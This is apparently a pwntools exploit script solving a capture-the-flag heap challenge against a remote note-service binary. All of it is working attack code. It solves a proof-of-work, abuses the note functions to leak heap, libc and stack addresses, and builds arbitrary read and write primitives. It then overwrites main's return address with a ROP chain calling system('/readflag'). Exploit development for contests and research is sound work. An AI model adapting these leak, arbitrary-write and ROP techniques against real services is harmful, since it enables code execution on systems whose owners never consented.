#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=43.154.211.24' '--port=11451' pwn
import gmpy2
from pwn import *
import time

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pwn')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '1.13.191.241'
port = int(args.PORT or 11451)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(['./lib64/ld-linux-x86-64.so.2', '--preload', './usr/lib/libc.so.6', exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(['./lib64/ld-linux-x86-64.so.2', '--preload', './usr/lib/libc.so.6', exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b exit
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def setnote(tp, idx, val, wait=True):
    io.sendline(b'1 %d %d\n%s' % (tp, idx, val))
    if wait:
        io.recvuntil(b'?\n?\n?\n?\n')

def shownote(tp, idx):
    io.sendline(b'2 %d %d' % (tp, idx))
    io.recvuntil(b'?\n?\n')
    return io.recvuntil(b'\n?\n', True)

def upgradenote(idx1, idx2):
    io.sendline(b'3 %d %d' % (idx1, idx2))
    io.recvuntil(b'?\n?\n?\n')

def do_pow(r: remote):
    r.recvuntil(b'2^(2^')
    bit = int(r.recvuntil(b')', drop=True))
    r.recvuntil(b'mod ')
    mod = int(r.recvuntil(b' =', drop=True))
    r.sendline(str(gmpy2.powmod(2, gmpy2.bit_set(0, bit), mod)).encode())
    r.recvuntil(b'ok\n')

do_pow(io)

io.recvuntil(b'?\n')
setnote(1, 4, cyclic(0x9f))
upgradenote(4, 4)
heap_leak = shownote(1, 0)
heap_addr = unpack(heap_leak.ljust(context.bytes, b'\0'))
info("heap leak: %#x", heap_addr)

setnote(0, 0, cyclic(0x1000))  # too big for tcache
setnote(0, 1, cyclic(0x20))  # prevent top-consolidation
setnote(0, 0, cyclic(0x2000))  # free 0x1000, creating unsorted

def read8(addr):
    setnote(1, 0, pack(addr) + pack(8))
    return unpack(shownote(0, 4))

def write(addr, pay):
    setnote(1, 0, pack(addr) + pack(len(pay) + 1) * 2)
    setnote(0, 4, pay, False)

libc_addr = read8(heap_addr + 0x880)
info("libc leak: %#x", libc_addr)

libc = ELF('libc.so.6')
libc.address = libc_addr - 0x1d8c00

environ = libc.address + 0x1e0260
stack = read8(environ)
info("stack: %#x", stack)

main_retaddr = stack - 0x160 + 0x30
info("main_retaddr: %#x", main_retaddr)

rop = ROP(libc, base=main_retaddr)
rop.raw(rop.find_gadget(['ret'])[0])
rop.call("system", [b"/readflag"])
rop.call("exit", [3])
print(rop.dump())

write(main_retaddr, rop.chain())

io.interactive()